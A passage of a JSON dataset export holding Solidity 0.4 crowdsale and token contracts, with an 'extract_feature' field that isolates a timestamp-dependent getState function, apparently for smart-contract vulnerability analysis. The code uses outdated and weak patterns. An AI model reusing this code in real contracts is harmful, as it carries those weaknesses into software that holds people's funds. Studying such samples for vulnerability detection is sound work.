private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f78"
  },
  "filename": "9310.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns 